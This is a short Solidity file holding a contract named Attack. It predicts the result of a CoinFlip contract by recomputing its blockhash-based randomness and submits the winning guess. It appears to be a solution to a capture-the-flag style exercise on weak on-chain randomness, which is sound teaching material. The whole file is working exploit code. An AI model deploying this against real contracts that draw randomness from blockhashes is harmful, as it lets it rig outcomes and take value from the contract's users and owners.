// SPDX-License-Identifier: MIT
contract Attack{
    //pre-calculating the outcome
    //by copying the logic of calculating the variable side from contract CoinFlip
    function Guess(CoinFlip coinFlip)external{
         uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
         bool guess;
         uint256 side = (uint256(blockhash(block.number - 1)))/FACTOR;
         guess= side==1? true:false;
         coinFlip.flip(guess);
    }
}